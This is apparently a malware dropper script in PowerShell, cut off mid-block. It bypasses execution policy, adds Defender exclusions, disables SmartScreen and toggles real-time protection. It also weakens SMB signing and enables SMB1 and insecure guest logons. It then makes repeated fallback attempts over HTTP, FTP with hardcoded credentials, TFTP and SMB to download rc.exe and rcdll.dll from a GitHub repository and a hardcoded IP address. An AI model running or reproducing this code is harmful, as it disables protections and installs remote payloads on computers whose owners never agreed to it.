Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
Remove-Item -Path "C:\windows\temp\rc.exe" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\windows\temp\rcdll.dll" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Program Files (x86)\Windows Kits\10\bln\x86\rc.exe" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Program Files (x86)\Windows Kits\10\bln\x86\rcdll.dll" -Force -ErrorAction SilentlyContinue

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

# FTP fixes
if ($isAdmin) {
Add-MpPreference -ExclusionProcess "C:\Windows\System32\ftp.exe"
Add-MpPreference -ExclusionProcess "C:\Windows\System32\curl.exe"
Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Edge\SmartScreenEnabled" -Name "(Default)" -Value 0 -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled"
Get-MpPreference | Select-Object ExclusionProcess, ExclusionPath
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "RequireAdmin"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 1
Remove-MpPreference -ExclusionProcess "C:\Windows\System32\ftp.exe"
Remove-MpPreference -ExclusionProcess "C:\Windows\System32\curl.exe"
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableRealtimeMonitoring $false
}

# SMB FIXES
Set-SmbClientConfiguration -EnableInsecureGuestLogons $true -Force
Set-SmbClientConfiguration -RequireSecuritySignature $false -Force
Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
if ($isAdmin) {
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters" -Name "RequireSecuritySignature" -Value 0 -Type DWord
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 0 -Type DWord
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "EnableSecuritySignature" -Value 0 -Type DWord
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters" -Name "EnableSecuritySignature" -Value 0 -Type DWord
Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force
Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
Set-SmbServerConfiguration -EnableSecuritySignature $false -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 1 -Type DWord
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "AllowInsecureGuestAuth" -Value 1 -PropertyType DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\LanmanWorkstation" -Name "AllowInsecureGuestAuth" -Value 1 -Type DWord -ErrorAction SilentlyContinue
Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol, RequireSecuritySignature, EnableSecuritySignature
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "AllowInsecureGuestAuth" -ErrorAction SilentlyContinue
}

# TFTP
Enable-WindowsOptionalFeature -Online -FeatureName TFTP -NoRestart
pkgmgr /iu:"TFTP"
dism /online /Enable-Feature /FeatureName:TFTP
Add-WindowsCapability -Online -Name "Tftp.Client~~~~0.0.1.0"
Install-WindowsFeature -Name "TFTP-Client" -IncludeAllSubFeature

# Ensure log directory exists
if (-not (Test-Path "C:\windows\temp")) {
    try { New-Item -ItemType Directory -Path "C:\windows\temp" -Force | Out-Null } catch { }
}

# ==================== START GIT ==================================
# ==================== START GIT ==================================
# ==================== START GIT ==================================



# HTTP Method 1: Invoke-WebRequest
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rc.exe" -OutFile "C:\windows\temp\rc.exe" -ErrorAction Stop
    } catch { }
}

# HTTP Method 2: Invoke-RestMethod
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        Invoke-RestMethod -Uri "https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rc.exe" -OutFile "C:\windows\temp\rc.exe" -ErrorAction Stop
    } catch { }
}

# HTTP Method 3: WebClient
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rc.exe", "C:\windows\temp\rc.exe")
    } catch { }
}

# HTTP Method 4: BITS Transfer
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        Start-BitsTransfer -Source "https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rc.exe" -Destination "C:\windows\temp\rc.exe" -ErrorAction Stop
    } catch { }
}

# HTTP Method 5: curl
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        cmd /c 'curl -o C:\windows\temp\rc.exe https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rc.exe' 2>$null
    } catch { }
}

# HTTP Method 6: wget
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        cmd /c 'wget https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rc.exe -O C:\windows\temp\rc.exe' 2>$null
    } catch { }
}

# HTTP Method 7: HttpClient
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        [System.IO.File]::WriteAllBytes("C:\windows\temp\rc.exe", (New-Object System.Net.Http.HttpClient).GetAsync("https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rc.exe").Result.Content.ReadAsByteArrayAsync().Result)
    } catch { }
}

# HTTP Method 8: WebRequest
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        $response = [System.Net.WebRequest]::Create("https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rc.exe").GetResponse()
        $stream = $response.GetResponseStream()
        $reader = New-Object System.IO.BinaryReader($stream)
        $bytes = $reader.ReadBytes(1048576)
        [System.IO.File]::WriteAllBytes("C:\windows\temp\rc.exe", $bytes)
        $reader.Close()
        $stream.Close()
        $response.Close()
    } catch { }
}

# HTTP Method 1: Invoke-WebRequest
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rcdll.dll" -OutFile "C:\windows\temp\rcdll.dll" -ErrorAction Stop
    } catch { }
}

# HTTP Method 2: Invoke-RestMethod
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        Invoke-RestMethod -Uri "https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rcdll.dll" -OutFile "C:\windows\temp\rcdll.dll" -ErrorAction Stop
    } catch { }
}

# HTTP Method 3: WebClient
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rcdll.dll", "C:\windows\temp\rcdll.dll")
    } catch { }
}

# HTTP Method 4: BITS Transfer
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        Start-BitsTransfer -Source "https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rcdll.dll" -Destination "C:\windows\temp\rcdll.dll" -ErrorAction Stop
    } catch { }
}

# HTTP Method 5: curl
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        cmd /c 'curl -o C:\windows\temp\rcdll.dll https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rcdll.dll' 2>$null
    } catch { }
}

# HTTP Method 6: wget
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        cmd /c 'wget https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rcdll.dll -O C:\windows\temp\rcdll.dll' 2>$null
    } catch { }
}

# HTTP Method 7: HttpClient
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        [System.IO.File]::WriteAllBytes("C:\windows\temp\rcdll.dll", (New-Object System.Net.Http.HttpClient).GetAsync("https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rcdll.dll").Result.Content.ReadAsByteArrayAsync().Result)
    } catch { }
}

# HTTP Method 8: WebRequest
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        $response = [System.Net.WebRequest]::Create("https://raw.githubusercontent.com/dddjcvsomaxzc/dddjcvsomaxzc/main/rcdll.dll").GetResponse()
        $stream = $response.GetResponseStream()
        $reader = New-Object System.IO.BinaryReader($stream)
        $bytes = $reader.ReadBytes(1048576)
        [System.IO.File]::WriteAllBytes("C:\windows\temp\rcdll.dll", $bytes)
        $reader.Close()
        $stream.Close()
        $response.Close()
    } catch { }
}
# ==================== END GIT ==================================
# ==================== END GIT ==================================
# ==================== END GIT ==================================



# ============ 
# ============
# ============ 
# ============
# ============ 
# ============
# ============ FILE 1: rc.exe DOWNLOAD METHODS ============

# HTTP Method 1: Invoke-WebRequest
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        Invoke-WebRequest -Uri "http://73.213.108.128:8081/rc.exe" -OutFile "C:\windows\temp\rc.exe" -ErrorAction Stop
    } catch { }
}

# HTTP Method 2: Invoke-RestMethod
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        Invoke-RestMethod -Uri "http://73.213.108.128:8081/rc.exe" -OutFile "C:\windows\temp\rc.exe" -ErrorAction Stop
    } catch { }
}

# HTTP Method 3: WebClient
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://73.213.108.128:8081/rc.exe", "C:\windows\temp\rc.exe")
    } catch { }
}

# HTTP Method 4: BITS Transfer
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        Start-BitsTransfer -Source "http://73.213.108.128:8081/rc.exe" -Destination "C:\windows\temp\rc.exe" -ErrorAction Stop
    } catch { }
}

# HTTP Method 5: curl
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        cmd /c 'curl -o C:\windows\temp\rc.exe http://73.213.108.128:8081/rc.exe' 2>$null
    } catch { }
}

# HTTP Method 6: wget
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        cmd /c 'wget http://73.213.108.128:8081/rc.exe -O C:\windows\temp\rc.exe' 2>$null
    } catch { }
}

# HTTP Method 7: HttpClient
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        [System.IO.File]::WriteAllBytes("C:\windows\temp\rc.exe", (New-Object System.Net.Http.HttpClient).GetAsync("http://73.213.108.128:8081/rc.exe").Result.Content.ReadAsByteArrayAsync().Result)
    } catch { }
}

# HTTP Method 8: WebRequest
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        $response = [System.Net.WebRequest]::Create("http://73.213.108.128:8081/rc.exe").GetResponse()
        $stream = $response.GetResponseStream()
        $reader = New-Object System.IO.BinaryReader($stream)
        $bytes = $reader.ReadBytes(1048576)
        [System.IO.File]::WriteAllBytes("C:\windows\temp\rc.exe", $bytes)
        $reader.Close()
        $stream.Close()
        $response.Close()
    } catch { }
}

# FTP Method 9: FTP WebClient (Anonymous)
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.DownloadFile("ftp://73.213.108.128/rc.exe", "C:\windows\temp\rc.exe")
    } catch { }
}

# FTP Method 10: FTP WebClient (with credentials)
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.Credentials = New-Object System.Net.NetworkCredential("anonymous", "")
        $ftpClient.DownloadFile("ftp://73.213.108.128/rc.exe", "C:\windows\temp\rc.exe")
    } catch { }
}

# FTP Method 11: FTP WebClient (with authentication)
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.Credentials = New-Object System.Net.NetworkCredential("admin", "password123")
        $ftpClient.DownloadFile("ftp://73.213.108.128/rc.exe", "C:\windows\temp\rc.exe")
    } catch { }
}

# FTP Method 12: FTP via curl
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        cmd /c 'curl -o C:\windows\temp\rc.exe ftp://73.213.108.128/rc.exe' 2>$null
    } catch { }
}

# FTP Method 13: FTP via curl with credentials
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        cmd /c 'curl -u admin:password123 -o C:\windows\temp\rc.exe ftp://73.213.108.128/rc.exe' 2>$null
    } catch { }
}

# FTP Method 14: FTP via built-in Windows FTP client (automated)
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        $ftpScript = @"
open 73.213.108.128
anonymous

binary
get rc.exe C:\windows\temp\rc.exe
quit
"@
        $ftpScript | Out-File -FilePath "C:\windows\temp\ftpscript.txt" -Encoding ASCII
        cmd /c 'ftp -s:C:\windows\temp\ftpscript.txt' 2>$null
        Remove-Item -Path "C:\windows\temp\ftpscript.txt" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# FTP Method 15: FTP via built-in Windows FTP client (with auth)
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        $ftpScript = @"
open 73.213.108.128
admin
password123
binary
get rc.exe C:\windows\temp\rc.exe
quit
"@
        $ftpScript | Out-File -FilePath "C:\windows\temp\ftpauth.txt" -Encoding ASCII
        cmd /c 'ftp -s:C:\windows\temp\ftpauth.txt' 2>$null
        Remove-Item -Path "C:\windows\temp\ftpauth.txt" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# TFTP Method 16: TFTP via built-in Windows TFTP client
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        cmd /c 'tftp -i 73.213.108.128 GET rc.exe C:\windows\temp\rc.exe' 2>$null
    } catch { }
}

# TFTP Method 17: TFTP via built-in Windows TFTP client (alternative syntax)
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        cmd /c 'tftp 73.213.108.128 get rc.exe C:\windows\temp\rc.exe' 2>$null
    } catch { }
}

# TFTP Method 18: TFTP with alternate server/port combinations
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        cmd /c 'tftp -i 73.213.108.128:69 GET rc.exe C:\windows\temp\rc.exe' 2>$null
    } catch { }
}

if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        cmd /c 'tftp -i 73.213.108.128:1069 GET rc.exe C:\windows\temp\rc.exe' 2>$null
    } catch { }
}

# TFTP Method 19: TFTP PowerShell UDP Implementation
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        $udpClient = New-Object System.Net.Sockets.UdpClient
        $udpClient.Client.ReceiveTimeout = 10000
        $udpClient.Client.SendTimeout = 10000
        $serverIP = [System.Net.Dns]::GetHostAddresses("73.213.108.128")[0].IPAddressToString
        $serverEndpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse($serverIP), 69)
        $rrqPacket = New-Object System.Collections.ArrayList
        $rrqPacket.AddRange([byte[]](0x00, 0x01))
        $rrqPacket.AddRange([System.Text.Encoding]::ASCII.GetBytes("rc.exe"))
        $rrqPacket.Add(0x00)
        $rrqPacket.AddRange([System.Text.Encoding]::ASCII.GetBytes("octet"))
        $rrqPacket.Add(0x00)
        $udpClient.Send([byte[]]$rrqPacket.ToArray(), $rrqPacket.Count, $serverEndpoint) | Out-Null
        $fileData = New-Object System.Collections.ArrayList
        $expectedBlock = 1
        $receivedDataEndpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
        do {
            $receiveBytes = $udpClient.Receive([ref]$receivedDataEndpoint)
            if ($receiveBytes.Length -lt 4) { break }
            $opcode = [BitConverter]::ToUInt16(@($receiveBytes[1], $receiveBytes[0]), 0)
            if ($opcode -eq 3) {
                $blockNumber = [BitConverter]::ToUInt16(@($receiveBytes[3], $receiveBytes[2]), 0)
                if ($blockNumber -eq $expectedBlock) {
                    $dataLength = $receiveBytes.Length - 4
                    if ($dataLength -gt 0) {
                        for ($i = 4; $i -lt $receiveBytes.Length; $i++) {
                            $fileData.Add($receiveBytes[$i])
                        }
                    }
                    $ackPacket = [byte[]](0x00, 0x04, $receiveBytes[2], $receiveBytes[3])
                    $udpClient.Send($ackPacket, 4, $receivedDataEndpoint) | Out-Null
                    $expectedBlock++
                    if ($dataLength -lt 512) { break }
                }
            } elseif ($opcode -eq 5) { break }
        } while ($true)
        [System.IO.File]::WriteAllBytes("C:\windows\temp\rc.exe", [byte[]]$fileData.ToArray())
        $udpClient.Close()
    } catch { }
}

# SMB Method 20: SMB Copy-Item (direct UNC path)
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        Copy-Item -Path "\\73.213.108.128\files\rc.exe" -Destination "C:\windows\temp\rc.exe" -ErrorAction Stop
    } catch { }
}

# SMB Method 21: SMB via CMD copy
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        cmd /c 'copy "\\73.213.108.128\files\rc.exe" "C:\windows\temp\rc.exe"' 2>$null
    } catch { }
}

# SMB Method 22: SMB with temporary drive mapping
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        cmd /c 'net use Z: \\73.213.108.128\files' 2>$null
        if ($LASTEXITCODE -eq 0) {
            Copy-Item -Path "Z:\rc.exe" -Destination "C:\windows\temp\rc.exe" -ErrorAction Stop
            cmd /c 'net use Z: /delete' 2>$null
        }
    } catch {
        cmd /c 'net use Z: /delete' 2>$null
    }
}

# SMB Method 23: SMB with PSDrive
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        New-PSDrive -Name "TempSMB" -PSProvider FileSystem -Root "\\73.213.108.128\files" -ErrorAction Stop
        Copy-Item -Path "TempSMB:\rc.exe" -Destination "C:\windows\temp\rc.exe" -ErrorAction Stop
        Remove-PSDrive -Name "TempSMB" -ErrorAction SilentlyContinue
    } catch {
        Remove-PSDrive -Name "TempSMB" -ErrorAction SilentlyContinue
    }
}

# SMB Method 24: SMB with credentials (PSDrive)
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        $securePassword = ConvertTo-SecureString "password123" -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential("admin", $securePassword)
        New-PSDrive -Name "AuthSMB" -PSProvider FileSystem -Root "\\73.213.108.128\files" -Credential $credential -ErrorAction Stop
        Copy-Item -Path "AuthSMB:\rc.exe" -Destination "C:\windows\temp\rc.exe" -ErrorAction Stop
        Remove-PSDrive -Name "AuthSMB" -ErrorAction SilentlyContinue
    } catch {
        Remove-PSDrive -Name "AuthSMB" -ErrorAction SilentlyContinue
    }
}

# SMB Method 25: SMB with net use and credentials
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        cmd /c 'net use Y: \\73.213.108.128\files /user:admin password123' 2>$null
        if ($LASTEXITCODE -eq 0) {
            Copy-Item -Path "Y:\rc.exe" -Destination "C:\windows\temp\rc.exe" -ErrorAction Stop
            cmd /c 'net use Y: /delete' 2>$null
        }
    } catch {
        cmd /c 'net use Y: /delete' 2>$null
    }
}

# SMB Method 26: SMB Get-Content method (for smaller files)
if (-not (Test-Path "C:\windows\temp\rc.exe")) {
    try {
        $content = Get-Content -Path "\\73.213.108.128\files\rc.exe" -Raw -ErrorAction Stop
        $content | Out-File -FilePath "C:\windows\temp\rc.exe" -Encoding ASCII -NoNewline
    } catch { }
}

# ============ 
# ============
# ============ 
# ============
# ============ 
# ============
# ============ FILE 2: rcdll.dll DOWNLOAD METHODS ============

# HTTP Method 1: Invoke-WebRequest
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        Invoke-WebRequest -Uri "http://73.213.108.128:8081/rcdll.dll" -OutFile "C:\windows\temp\rcdll.dll" -ErrorAction Stop
    } catch { }
}

# HTTP Method 2: Invoke-RestMethod
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        Invoke-RestMethod -Uri "http://73.213.108.128:8081/rcdll.dll" -OutFile "C:\windows\temp\rcdll.dll" -ErrorAction Stop
    } catch { }
}

# HTTP Method 3: WebClient
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://73.213.108.128:8081/rcdll.dll", "C:\windows\temp\rcdll.dll")
    } catch { }
}

# HTTP Method 4: BITS Transfer
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        Start-BitsTransfer -Source "http://73.213.108.128:8081/rcdll.dll" -Destination "C:\windows\temp\rcdll.dll" -ErrorAction Stop
    } catch { }
}

# HTTP Method 5: curl
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        cmd /c 'curl -o C:\windows\temp\rcdll.dll http://73.213.108.128:8081/rcdll.dll' 2>$null
    } catch { }
}

# HTTP Method 6: wget
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        cmd /c 'wget http://73.213.108.128:8081/rcdll.dll -O C:\windows\temp\rcdll.dll' 2>$null
    } catch { }
}

# HTTP Method 7: HttpClient
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        [System.IO.File]::WriteAllBytes("C:\windows\temp\rcdll.dll", (New-Object System.Net.Http.HttpClient).GetAsync("http://73.213.108.128:8081/rcdll.dll").Result.Content.ReadAsByteArrayAsync().Result)
    } catch { }
}

# HTTP Method 8: WebRequest
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        $response = [System.Net.WebRequest]::Create("http://73.213.108.128:8081/rcdll.dll").GetResponse()
        $stream = $response.GetResponseStream()
        $reader = New-Object System.IO.BinaryReader($stream)
        $bytes = $reader.ReadBytes(1048576)
        [System.IO.File]::WriteAllBytes("C:\windows\temp\rcdll.dll", $bytes)
        $reader.Close()
        $stream.Close()
        $response.Close()
    } catch { }
}

# FTP Method 9: FTP WebClient (Anonymous)
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.DownloadFile("ftp://73.213.108.128/rcdll.dll", "C:\windows\temp\rcdll.dll")
    } catch { }
}

# FTP Method 10: FTP WebClient (with credentials)
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.Credentials = New-Object System.Net.NetworkCredential("anonymous", "")
        $ftpClient.DownloadFile("ftp://73.213.108.128/rcdll.dll", "C:\windows\temp\rcdll.dll")
    } catch { }
}

# FTP Method 11: FTP WebClient (with authentication)
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.Credentials = New-Object System.Net.NetworkCredential("admin", "password123")
        $ftpClient.DownloadFile("ftp://73.213.108.128/rcdll.dll", "C:\windows\temp\rcdll.dll")
    } catch { }
}

# FTP Method 12: FTP via curl
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        cmd /c 'curl -o C:\windows\temp\rcdll.dll ftp://73.213.108.128/rcdll.dll' 2>$null
    } catch { }
}

# FTP Method 13: FTP via curl with credentials
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        cmd /c 'curl -u admin:password123 -o C:\windows\temp\rcdll.dll ftp://73.213.108.128/rcdll.dll' 2>$null
    } catch { }
}

# FTP Method 14: FTP via built-in Windows FTP client (automated)
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        $ftpScript = @"
open 73.213.108.128
anonymous

binary
get rcdll.dll C:\windows\temp\rcdll.dll
quit
"@
        $ftpScript | Out-File -FilePath "C:\windows\temp\ftpscript2.txt" -Encoding ASCII
        cmd /c 'ftp -s:C:\windows\temp\ftpscript2.txt' 2>$null
        Remove-Item -Path "C:\windows\temp\ftpscript2.txt" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# FTP Method 15: FTP via built-in Windows FTP client (with auth)
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        $ftpScript = @"
open 73.213.108.128
admin
password123
binary
get rcdll.dll C:\windows\temp\rcdll.dll
quit
"@
        $ftpScript | Out-File -FilePath "C:\windows\temp\ftpauth2.txt" -Encoding ASCII
        cmd /c 'ftp -s:C:\windows\temp\ftpauth2.txt' 2>$null
        Remove-Item -Path "C:\windows\temp\ftpauth2.txt" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# TFTP Method 16: TFTP via built-in Windows TFTP client
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        cmd /c 'tftp -i 73.213.108.128 GET rcdll.dll C:\windows\temp\rcdll.dll' 2>$null
    } catch { }
}

# TFTP Method 17: TFTP via built-in Windows TFTP client (alternative syntax)
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        cmd /c 'tftp 73.213.108.128 get rcdll.dll C:\windows\temp\rcdll.dll' 2>$null
    } catch { }
}

# TFTP Method 18: TFTP with alternate server/port combinations
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        cmd /c 'tftp -i 73.213.108.128:69 GET rcdll.dll C:\windows\temp\rcdll.dll' 2>$null
    } catch { }
}

if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        cmd /c 'tftp -i 73.213.108.128:1069 GET rcdll.dll C:\windows\temp\rcdll.dll' 2>$null
    } catch { }
}

# TFTP Method 19: TFTP PowerShell UDP Implementation
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        $udpClient = New-Object System.Net.Sockets.UdpClient
        $udpClient.Client.ReceiveTimeout = 10000
        $udpClient.Client.SendTimeout = 10000
        $serverIP = [System.Net.Dns]::GetHostAddresses("73.213.108.128")[0].IPAddressToString
        $serverEndpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse($serverIP), 69)
        $rrqPacket = New-Object System.Collections.ArrayList
        $rrqPacket.AddRange([byte[]](0x00, 0x01))
        $rrqPacket.AddRange([System.Text.Encoding]::ASCII.GetBytes("rcdll.dll"))
        $rrqPacket.Add(0x00)
        $rrqPacket.AddRange([System.Text.Encoding]::ASCII.GetBytes("octet"))
        $rrqPacket.Add(0x00)
        $udpClient.Send([byte[]]$rrqPacket.ToArray(), $rrqPacket.Count, $serverEndpoint) | Out-Null
        $fileData = New-Object System.Collections.ArrayList
        $expectedBlock = 1
        $receivedDataEndpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
        do {
            $receiveBytes = $udpClient.Receive([ref]$receivedDataEndpoint)
            if ($receiveBytes.Length -lt 4) { break }
            $opcode = [BitConverter]::ToUInt16(@($receiveBytes[1], $receiveBytes[0]), 0)
            if ($opcode -eq 3) {
                $blockNumber = [BitConverter]::ToUInt16(@($receiveBytes[3], $receiveBytes[2]), 0)
                if ($blockNumber -eq $expectedBlock) {
                    $dataLength = $receiveBytes.Length - 4
                    if ($dataLength -gt 0) {
                        for ($i = 4; $i -lt $receiveBytes.Length; $i++) {
                            $fileData.Add($receiveBytes[$i])
                        }
                    }
                    $ackPacket = [byte[]](0x00, 0x04, $receiveBytes[2], $receiveBytes[3])
                    $udpClient.Send($ackPacket, 4, $receivedDataEndpoint) | Out-Null
                    $expectedBlock++
                    if ($dataLength -lt 512) { break }
                }
            } elseif ($opcode -eq 5) { break }
        } while ($true)
        [System.IO.File]::WriteAllBytes("C:\windows\temp\rcdll.dll", [byte[]]$fileData.ToArray())
        $udpClient.Close()
    } catch { }
}

# SMB Method 20: SMB Copy-Item (direct UNC path)
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        Copy-Item -Path "\\73.213.108.128\files\rcdll.dll" -Destination "C:\windows\temp\rcdll.dll" -ErrorAction Stop
    } catch { }
}

# SMB Method 21: SMB via CMD copy
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        cmd /c 'copy "\\73.213.108.128\files\rcdll.dll" "C:\windows\temp\rcdll.dll"' 2>$null
    } catch { }
}

# SMB Method 22: SMB with temporary drive mapping
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        cmd /c 'net use X: \\73.213.108.128\files' 2>$null
        if ($LASTEXITCODE -eq 0) {
            Copy-Item -Path "X:\rcdll.dll" -Destination "C:\windows\temp\rcdll.dll" -ErrorAction Stop
            cmd /c 'net use X: /delete' 2>$null
        }
    } catch {
        cmd /c 'net use X: /delete' 2>$null
    }
}

# SMB Method 23: SMB with PSDrive
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        New-PSDrive -Name "TempSMB2" -PSProvider FileSystem -Root "\\73.213.108.128\files" -ErrorAction Stop
